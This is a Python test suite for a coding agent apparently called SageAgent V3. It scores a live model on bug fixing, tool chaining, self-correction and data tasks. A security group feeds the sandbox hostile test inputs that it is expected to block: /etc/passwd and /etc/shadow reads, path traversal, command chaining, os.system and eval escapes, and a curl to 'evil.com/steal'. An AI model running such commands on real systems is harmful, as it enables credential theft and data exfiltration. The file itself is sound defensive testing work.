#!/usr/bin/env python3
"""
SageAgent V3 — Advanced Edge Case & Complex Scenario Tests
Tests what separates top-tier coding agents from basic ones.

Benchmarked against capabilities of: Aider, Cline, OpenHands, SWE-agent
Each test tracks cost and latency.

Usage: cd compact_v3/MAIN/agent && python3 ../tests/test_advanced.py
"""
import sys, os, json, time, tempfile, shutil, threading

AGENT_DIR = os.path.join(os.path.dirname(__file__), "..", "agent")
sys.path.insert(0, AGENT_DIR)

LIVE_MODEL = "au.anthropic.claude-haiku-4-5-20251001-v1:0"
REGION = "ap-southeast-2"

RESULTS = []
PERF = []

def test(group, name):
    def decorator(func):
        def wrapper():
            t0 = time.time()
            try:
                ok, detail = func()
                status = "PASS" if ok else "FAIL"
            except Exception as e:
                import traceback
                detail = f"{e}\n{traceback.format_exc()}"
                status = "ERROR"
            elapsed = time.time() - t0
            RESULTS.append({"group": group, "name": name, "status": status, "detail": str(detail)[:300], "time": elapsed})
            icon = {"PASS": "✓", "FAIL": "✗", "ERROR": "!"}[status]
            print(f"  [{icon}] {name} ({elapsed:.1f}s): {str(detail)[:150]}")
            return status == "PASS"
        return wrapper
    return decorator

def run_agent(task, system=None, max_turns=8):
    """Helper: run agent, return (result, outputs, cost, calls)."""
    from sagemaker_agent import Agent, BedrockClient, TOKENS
    client = BedrockClient(model_id=LIVE_MODEL, region=REGION)
    c0, t0 = TOKENS.session_cost, TOKENS.api_calls
    outputs = []
    agent = Agent(client, f"test_{int(time.time())}",
                  on_approval=lambda *a, **k: True,
                  on_ask_user=lambda *a, **k: "yes")
    result = agent.run(task,
                       system_prompt=system or "You are a coding assistant. Be brief and precise. Use tools.",
                       output_fn=lambda t: outputs.append(t),
                       max_turns_override=max_turns)
    cost = TOKENS.session_cost - c0
    calls = TOKENS.api_calls - t0
    return result, outputs, cost, calls

# ============================================================
# GROUP 1: MULTI-STEP REASONING (Aider-level)
# ============================================================
print("\n=== GROUP 1: Multi-Step Reasoning ===")

@test("reasoning", "Find bug in code, explain cause, suggest fix")
def t1_1():
    from sagemaker_agent import tool_write_file, CONFIG
    # Write a buggy Python file
    path = os.path.join(CONFIG.workspace, "buggy_calc.py")
    tool_write_file({"file_path": path, "content": """def calculate_average(numbers):
    total = 0
    for n in numbers:
        total += n
    return total / len(numbers)  # Bug: crashes on empty list

def process_data(data):
    results = []
    for group in data:
        avg = calculate_average(group)
        results.append(avg)
    return results

# This will crash:
# process_data([[], [1, 2, 3]])
"""})
    try:
        result, outputs, cost, calls = run_agent(
            "Read buggy_calc.py, find the bug, explain what causes it, and fix it using edit_file. The bug is a crash on certain inputs.",
            max_turns=8
        )
        PERF.append({"test": "find+fix bug", "cost": cost, "calls": calls})
        # Check: agent should have found the division by zero bug and fixed it
        content = open(path).read() if os.path.exists(path) else ""
        fixed = "len(numbers)" in content and ("if not" in content or "if len" in content or "== 0" in content or "empty" in content.lower())
        explained = "division" in result.lower() or "zero" in result.lower() or "empty" in result.lower()
        return fixed and explained, f"fixed={'✓' if fixed else '✗'}, explained={'✓' if explained else '✗'}, cost=${cost:.4f}, calls={calls}"
    finally:
        if os.path.exists(path): os.unlink(path)
t1_1()

@test("reasoning", "Multi-file analysis: find all functions, count lines")
def t1_2():
    from sagemaker_agent import CONFIG
    result, outputs, cost, calls = run_agent(
        "Use grep to find all function definitions (def ...) in sagemaker_agent.py. Count how many there are. Also tell me the total line count of the file. Be precise with numbers.",
        max_turns=6
    )
    PERF.append({"test": "grep+count", "cost": cost, "calls": calls})
    # Should find 50+ functions and 7000+ lines
    has_count = any(str(n) in result for n in range(40, 200))  # Function count
    has_lines = any(str(n) in result for n in range(6000, 8000))  # Line count
    return has_count or has_lines, f"numbers in result={'✓' if has_count or has_lines else '✗'}, cost=${cost:.4f}"
t1_2()

# ============================================================
# GROUP 2: EDGE CASES (break weaker agents)
# ============================================================
print("\n=== GROUP 2: Edge Cases ===")

@test("edge", "Edit file with special chars (quotes, backslashes)")
def t2_1():
    from sagemaker_agent import tool_write_file, tool_edit_file, CONFIG
    path = os.path.join(CONFIG.workspace, "special_chars.py")
    tool_write_file({"file_path": path, "content": 'msg = "Hello \\\"World\\\""\npath = "C:\\\\Users\\\\test"\n'})
    try:
        result, outputs, cost, calls = run_agent(
            f"Read special_chars.py, then change the msg variable to contain 'Hello \"Universe\"' (with escaped quotes). Use edit_file.",
            max_turns=6
        )
        PERF.append({"test": "special chars", "cost": cost, "calls": calls})
        content = open(path).read() if os.path.exists(path) else ""
        return "Universe" in content, f"content has Universe={'✓' if 'Universe' in content else '✗'}, cost=${cost:.4f}"
    finally:
        if os.path.exists(path): os.unlink(path)
t2_1()

@test("edge", "Handle non-existent file gracefully")
def t2_2():
    result, outputs, cost, calls = run_agent(
        "Read the file does_not_exist_xyz.py and tell me what happened.",
        max_turns=3
    )
    PERF.append({"test": "missing file", "cost": cost, "calls": calls})
    handled = "not found" in result.lower() or "error" in result.lower() or "does not exist" in result.lower() or "doesn't exist" in result.lower()
    return handled, f"graceful={'✓' if handled else '✗'}, cost=${cost:.4f}"
t2_2()

@test("edge", "Doom loop: agent doesn't repeat same failing tool call")
def t2_3():
    result, outputs, cost, calls = run_agent(
        "Try to read /etc/shadow (this will be blocked by security). Tell me what happened. Do NOT keep retrying.",
        max_turns=5
    )
    PERF.append({"test": "doom loop", "cost": cost, "calls": calls})
    # Should NOT make many calls — security blocks it, agent should explain and stop
    return calls <= 3, f"calls={calls} (should be <=3), cost=${cost:.4f}"
t2_3()

@test("edge", "Large output handling: grep returns many results")
def t2_4():
    result, outputs, cost, calls = run_agent(
        "Search for the word 'self' in sagemaker_agent.py using grep. The results will be very long. Summarize how many matches you found.",
        max_turns=4
    )
    PERF.append({"test": "large output", "cost": cost, "calls": calls})
    # Agent should handle truncated output gracefully
    has_number = any(c.isdigit() for c in result)
    return has_number, f"summarized with count={'✓' if has_number else '✗'}, cost=${cost:.4f}"
t2_4()

# ============================================================
# GROUP 3: TOOL CHAINING (Cline/OpenHands-level)
# ============================================================
print("\n=== GROUP 3: Tool Chaining ===")

@test("chain", "Read → analyze → write summary file")
def t3_1():
    from sagemaker_agent import CONFIG
    summary_path = os.path.join(CONFIG.workspace, "analysis_summary.md")
    try:
        result, outputs, cost, calls = run_agent(
            "Read USER_GUIDE.md (first 50 lines). Write a brief summary (3-5 bullet points) of what SageAgent V3 is, and save it to analysis_summary.md.",
            max_turns=8
        )
        PERF.append({"test": "read→write chain", "cost": cost, "calls": calls})
        exists = os.path.exists(summary_path)
        content = open(summary_path).read() if exists else ""
        has_bullets = "-" in content or "*" in content or "•" in content
        return exists and has_bullets and len(content) > 50, f"created={'✓' if exists else '✗'}, bullets={'✓' if has_bullets else '✗'}, cost=${cost:.4f}"
    finally:
        if os.path.exists(summary_path): os.unlink(summary_path)
t3_1()

@test("chain", "Glob → read → grep: find config, extract settings")
def t3_2():
    result, outputs, cost, calls = run_agent(
        "Find all .json config files in the current directory using glob. Read the first one you find. Then tell me what settings are configured in it.",
        max_turns=8
    )
    PERF.append({"test": "glob→read→analyze", "cost": cost, "calls": calls})
    # Should find agent_config.json and describe its contents
    has_settings = "model" in result.lower() or "skills" in result.lower() or "config" in result.lower()
    return has_settings, f"found settings={'✓' if has_settings else '✗'}, cost=${cost:.4f}"
t3_2()

@test("chain", "Create Python file → run it → report output")
def t3_3():
    from sagemaker_agent import CONFIG
    test_path = os.path.join(CONFIG.workspace, "test_run_me.py")
    try:
        result, outputs, cost, calls = run_agent(
            "Write a Python file called test_run_me.py that prints the first 10 Fibonacci numbers. Then use python_exec to run it and report the output.",
            max_turns=8
        )
        PERF.append({"test": "write→run→report", "cost": cost, "calls": calls})
        has_fib = any(x in result or any(x in o for o in outputs) for x in ["1, 1, 2, 3, 5", "0, 1, 1, 2, 3", "fibonacci", "55", "34"])
        return has_fib, f"fibonacci found={'✓' if has_fib else '✗'}, cost=${cost:.4f}, calls={calls}"
    finally:
        if os.path.exists(test_path): os.unlink(test_path)
t3_3()

# ============================================================
# GROUP 4: SECURITY EDGE CASES
# ============================================================
print("\n=== GROUP 4: Security Edge Cases ===")

@test("security", "Path traversal blocked: ../../../etc/passwd")
def t4_1():
    from sagemaker_agent import tool_read_file
    result = tool_read_file({"file_path": "../../../etc/passwd"})
    blocked = "error" in result.lower() or "blocked" in result.lower() or "outside" in result.lower() or "not found" in result.lower()
    return blocked, f"blocked={'✓' if blocked else '✗'}: {result[:80]}"
t4_1()

@test("security", "Bash injection blocked: command chaining with ;")
def t4_2():
    from sagemaker_agent import tool_bash
    result = tool_bash({"command": "echo safe; cat /etc/passwd"})
    # The bash tool allows ; but the workspace path check should block /etc/passwd
    no_passwd = "root:" not in result
    return no_passwd, f"no /etc/passwd leak={'✓' if no_passwd else '✗'}"
t4_2()

@test("security", "Python exec: os.system blocked")
def t4_3():
    from sagemaker_agent import tool_python_exec
    result = tool_python_exec({"code": "import os; os.system('whoami')"})
    blocked = "blocked" in result.lower() or "security" in result.lower()
    return blocked, f"blocked={'✓' if blocked else '✗'}: {result[:80]}"
t4_3()

@test("security", "Python exec: eval/exec blocked")
def t4_4():
    from sagemaker_agent import tool_python_exec
    result = tool_python_exec({"code": "eval('__import__(\"subprocess\").run([\"ls\"])')"})
    blocked = "blocked" in result.lower() or "security" in result.lower()
    return blocked, f"blocked={'✓' if blocked else '✗'}: {result[:80]}"
t4_4()

@test("security", "Bash: curl to external URL blocked")
def t4_5():
    from sagemaker_agent import tool_bash
    result = tool_bash({"command": "curl https://evil.com/steal"})
    blocked = "blocked" in result.lower() or "not allowed" in result.lower()
    return blocked, f"blocked={'✓' if blocked else '✗'}: {result[:80]}"
t4_5()

@test("security", "Workspace sibling-dir boundary bypass blocked")
def t4_6b():
    from sagemaker_agent import SECURITY, CONFIG
    workspace = os.path.realpath(CONFIG.workspace)
    # Sibling directory (workspace + "_evil") must NOT pass
    evil = f"cat {workspace}_evil/secret.txt"
    ok, _ = SECURITY.validate_command(evil)
    return not ok, f"sibling dir {'blocked ✓' if not ok else 'ALLOWED ✗ — VULN!'}"
t4_6b()

@test("security", "Secret in file output: redacted in agent context")
def t4_6():
    from sagemaker_agent import _scan_output_secrets
    # Simulate reading a .env file with secrets
    file_content = """
DATABASE_URL=postgres://user:pass@host/db
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij
"""
    warn = _scan_output_secrets(file_content)
    return warn is not None, f"detected={'✓' if warn else '✗'}: {warn}"
t4_6()

# ============================================================
# GROUP 5: SELF-HEALING (SWE-agent level)
# ============================================================
print("\n=== GROUP 5: Self-Healing ===")

@test("heal", "Agent notices lint error and self-corrects")
def t5_1():
    from sagemaker_agent import CONFIG
    path = os.path.join(CONFIG.workspace, "test_selfheal.py")
    try:
        result, outputs, cost, calls = run_agent(
            "Write a Python file test_selfheal.py with a function that has a syntax error (missing colon after def). "
            "The auto-lint should catch it. When you see the SYNTAX ERROR, fix it immediately with edit_file.",
            system="You are a coding assistant. When you see a SYNTAX ERROR in tool output, fix it immediately. Use write_file then edit_file.",
            max_turns=8
        )
        PERF.append({"test": "self-heal", "cost": cost, "calls": calls})
        # The file should exist and be valid Python at the end
        if os.path.exists(path):
            import py_compile
            try:
                py_compile.compile(path, doraise=True)
                valid = True
            except py_compile.PyCompileError:
                valid = False
        else:
            valid = False
        lint_seen = any("SYNTAX" in o for o in outputs)
        return valid and lint_seen, f"valid_python={'✓' if valid else '✗'}, lint_seen={'✓' if lint_seen else '✗'}, cost=${cost:.4f}, calls={calls}"
    finally:
        if os.path.exists(path): os.unlink(path)
t5_1()

@test("heal", "Agent recovers from failed tool call")
def t5_2():
    result, outputs, cost, calls = run_agent(
        "Try to edit the file nonexistent_file.py to change 'old' to 'new'. When it fails (file doesn't exist), "
        "instead create the file with the content 'new content here' using write_file.",
        max_turns=6
    )
    from sagemaker_agent import CONFIG
    path = os.path.join(CONFIG.workspace, "nonexistent_file.py")
    PERF.append({"test": "recover from fail", "cost": cost, "calls": calls})
    try:
        exists = os.path.exists(path)
        return exists, f"recovered and created file={'✓' if exists else '✗'}, cost=${cost:.4f}"
    finally:
        if os.path.exists(path): os.unlink(path)
t5_2()

# ============================================================
# GROUP 6: COMPLEX REAL-WORLD TASKS
# ============================================================
print("\n=== GROUP 6: Complex Real-World Tasks ===")

@test("complex", "Data analysis: read CSV-like data, compute stats, create chart")
def t6_1():
    from sagemaker_agent import tool_write_file, CONFIG
    csv_path = os.path.join(CONFIG.workspace, "sales_data.csv")
    tool_write_file({"file_path": csv_path, "content": "month,revenue,costs\nJan,10000,7000\nFeb,12000,7500\nMar,15000,8000\nApr,11000,7200\nMay,18000,9000\nJun,20000,9500\n"})
    chart_path = os.path.join(CONFIG.workspace, "sales_chart.png")
    try:
        result, outputs, cost, calls = run_agent(
            "Read sales_data.csv. Calculate: total revenue, total costs, total profit, and the most profitable month. "
            "Then create a bar chart showing revenue vs costs by month (grouped_bar chart). Save as sales_chart.png.",
            max_turns=10
        )
        PERF.append({"test": "data analysis+chart", "cost": cost, "calls": calls})
        has_stats = any(x in result for x in ["86000", "86,000", "profit", "Jun", "June"])
        chart_exists = os.path.exists(chart_path)
        return has_stats and chart_exists, f"stats={'✓' if has_stats else '✗'}, chart={'✓' if chart_exists else '✗'}, cost=${cost:.4f}, calls={calls}"
    finally:
        for p in [csv_path, chart_path]:
            if os.path.exists(p): os.unlink(p)
t6_1()

@test("complex", "Code refactoring: extract function from duplicated logic")
def t6_2():
    from sagemaker_agent import tool_write_file, CONFIG
    path = os.path.join(CONFIG.workspace, "refactor_me.py")
    tool_write_file({"file_path": path, "content": """def process_orders(orders):
    valid = []
    for order in orders:
        if order.get('status') == 'active' and order.get('amount', 0) > 0:
            if order.get('customer_id') and order.get('product_id'):
                valid.append(order)
    return valid

def process_returns(returns):
    valid = []
    for ret in returns:
        if ret.get('status') == 'active' and ret.get('amount', 0) > 0:
            if ret.get('customer_id') and ret.get('product_id'):
                valid.append(ret)
    return valid
"""})
    try:
        result, outputs, cost, calls = run_agent(
            "Read refactor_me.py. The two functions have duplicated validation logic. "
            "Refactor by extracting a shared helper function called is_valid_record(). "
            "Both process_orders and process_returns should use it. Use edit_file.",
            max_turns=8
        )
        PERF.append({"test": "refactor", "cost": cost, "calls": calls})
        content = open(path).read() if os.path.exists(path) else ""
        has_helper = "is_valid_record" in content or "is_valid" in content
        # Verify it's valid Python
        import py_compile
        try:
            py_compile.compile(path, doraise=True)
            valid_py = True
        except py_compile.PyCompileError:
            valid_py = False
        return has_helper and valid_py, f"extracted={'✓' if has_helper else '✗'}, valid_python={'✓' if valid_py else '✗'}, cost=${cost:.4f}"
    finally:
        if os.path.exists(path): os.unlink(path)
t6_2()

@test("complex", "Todo-driven workflow: plan, execute, track progress")
def t6_3():
    from sagemaker_agent import CONFIG
    path = os.path.join(CONFIG.workspace, "hello_app.py")
    try:
        result, outputs, cost, calls = run_agent(
            "Plan and execute this 3-step task using todo_write to track progress:\n"
            "1. Create hello_app.py with a function greet(name) that returns 'Hello, {name}!'\n"
            "2. Use python_exec to test it: call greet('World') and print the result\n"
            "3. Mark all todos as completed\n"
            "Use todo_write at the start with all 3 steps, then execute each one.",
            max_turns=12
        )
        PERF.append({"test": "todo workflow", "cost": cost, "calls": calls})
        file_exists = os.path.exists(path)
        has_greeting = "Hello" in result or any("Hello" in o for o in outputs)
        used_todos = any("todo" in o.lower() for o in outputs)
        return file_exists and has_greeting, f"file={'✓' if file_exists else '✗'}, greeting={'✓' if has_greeting else '✗'}, todos={'✓' if used_todos else '✗'}, cost=${cost:.4f}"
    finally:
        if os.path.exists(path): os.unlink(path)
t6_3()

# ============================================================
# PERFORMANCE & COST SUMMARY
# ============================================================
print("\n" + "=" * 70)
print("PERFORMANCE & COST REPORT")
print("=" * 70)
total_cost = sum(p["cost"] for p in PERF)
total_calls = sum(p["calls"] for p in PERF)
for p in PERF:
    print(f"  {p['test']:25s} | cost=${p['cost']:.4f} | calls={p['calls']}")
print(f"  {'TOTAL':25s} | cost=${total_cost:.4f} | calls={total_calls}")
print(f"  Model: {LIVE_MODEL}")

# ============================================================
# RESULTS SUMMARY
# ============================================================
print("\n" + "=" * 70)
print("ADVANCED TEST RESULTS")
print("=" * 70)

total = len(RESULTS)
passed = sum(1 for r in RESULTS if r["status"] == "PASS")
failed = sum(1 for r in RESULTS if r["status"] == "FAIL")
errors = sum(1 for r in RESULTS if r["status"] == "ERROR")

for gname in ["reasoning", "edge", "chain", "security", "heal", "complex"]:
    items = [r for r in RESULTS if r["group"] == gname]
    gpass = sum(1 for r in items if r["status"] == "PASS")
    print(f"\n  [{gname.upper()}] {gpass}/{len(items)} passed")
    for r in items:
        icon = {"PASS": "✓", "FAIL": "✗", "ERROR": "!"}[r["status"]]
        print(f"    [{icon}] {r['name']} ({r['time']:.1f}s)")
        if r["status"] != "PASS":
            print(f"        → {r['detail'][:200]}")

print(f"\n{'=' * 70}")
print(f"TOTAL: {total} tests | {passed} PASS | {failed} FAIL | {errors} ERROR")
pct = (passed / total * 100) if total > 0 else 0
print(f"PASS RATE: {pct:.0f}%")
if pct == 100:
    print("\n--- TOP-TIER CODING AGENT VERIFIED ---")
elif pct >= 85:
    print("\n--- STRONG AGENT — minor gaps to fix ---")
else:
    print("\n--- NEEDS WORK — significant gaps ---")
print(f"{'=' * 70}")
